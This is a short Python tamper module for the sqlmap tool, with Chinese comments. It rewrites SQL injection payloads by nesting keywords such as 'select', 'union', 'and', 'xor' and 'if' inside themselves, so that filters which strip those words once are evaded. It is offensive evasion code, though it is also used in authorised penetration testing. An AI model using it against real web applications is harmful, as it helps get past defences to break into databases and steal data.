#!/usr/bin/python
#-*- coding:utf-8 -*-

#默认开头
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW     #等级（LOWEST 最低级）

#可有可无
def dependencies():
    pass


def tamper(payload, **kwargs):
    playload = payload.replace('and','anandd')
    playload = playload.replace('xor', 'xoxorr')
    playload = playload.replace('select', 'selselectect')
    playload = playload.replace('union', 'uniunionon')
    playload = playload.replace('if', 'iiff')
    return playload